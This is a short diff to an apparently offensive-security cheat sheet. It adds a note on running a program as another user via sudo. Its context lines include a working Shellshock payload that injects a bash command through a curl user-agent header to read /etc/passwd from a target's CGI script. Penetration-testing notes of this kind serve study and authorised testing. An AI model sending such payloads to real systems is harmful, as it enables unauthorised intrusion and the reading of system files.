@@ -1642,6 +1642,11 @@ Internet traffic on port 80 redirection from Kali to Victim
 	curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" <URL>/cgi-bin/<SCRIPT>
 	```
 
+14. Run program as another user (verify by sudo -l)
+	```
+	sudo  -u USER PROGRAM
+	```
+
 ## Useful Linux Commands
 ### Find a file
 
